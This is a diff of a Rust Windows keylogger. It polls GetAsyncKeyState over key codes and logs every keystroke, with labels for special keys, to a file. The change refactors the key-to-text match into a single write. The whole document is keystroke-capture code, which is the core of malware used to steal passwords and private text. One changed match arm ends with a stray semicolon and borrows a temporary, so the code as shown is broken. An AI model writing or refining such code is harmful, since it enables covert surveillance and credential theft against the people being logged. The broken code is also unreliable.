@@ -12,23 +12,24 @@ fn main() {
   loop {
   	for i in 8..190 {
     	if unsafe { user32::GetAsyncKeyState(i) } == -32767 {
-    		match i as u32 {
-    			32 => write!(&mut file," ").unwrap(),
-    			8 => write!(&mut file,"[BackSpace]").unwrap(),
-    			13 => write!(&mut file,"\n").unwrap(),
-    			winapi::VK_TAB => write!(&mut file,"[TAB]").unwrap(),
-    			winapi::VK_SHIFT => write!(&mut file,"[SHIFT]").unwrap(),
-    			winapi::VK_CONTROL => write!(&mut file,"[CTRL]").unwrap(),
-    			winapi::VK_ESCAPE => write!(&mut file,"[ESC]").unwrap(),
-    			winapi::VK_END => write!(&mut file,"[END]").unwrap(),
-    			winapi::VK_HOME => write!(&mut file,"[HOME]").unwrap(),
-    			winapi::VK_LEFT => write!(&mut file,"[LEFT]").unwrap(),
-    			winapi::VK_UP => write!(&mut file,"[UP]").unwrap(),
-    			winapi::VK_RIGHT => write!(&mut file,"[RIGHT]").unwrap(),
-    			winapi::VK_DOWN => write!(&mut file,"[DOWN]").unwrap(),
-    			190|110 => write!(&mut file,".").unwrap(),
-    			_ => write!(&mut file,"{}",i as u8 as char).unwrap()
+    		let key  = match i as u32 {
+    			32 => " ",
+    			8 => "[Backspace]",
+    			13 => "\n",
+    			winapi::VK_TAB => "[TAB]",
+    			winapi::VK_SHIFT => "[SHIFT]",
+    			winapi::VK_CONTROL => "[CTRL]",
+    			winapi::VK_ESCAPE => "[ESCAPE]",
+    			winapi::VK_END => "[END]",
+    			winapi::VK_HOME => "[HOME]",
+    			winapi::VK_LEFT => "[LEFT]",
+    			winapi::VK_UP => "[UP]",
+    			winapi::VK_RIGHT => "[RIGHT]",
+    			winapi::VK_DOWN => "[DOWN]",
+    			190|110 => ".",
+    			_ => &(i as u8 as char).to_string();
     		};
+    		write!(&mut file,"{}",key).unwrap();
     	}
     }
     file.flush().unwrap();
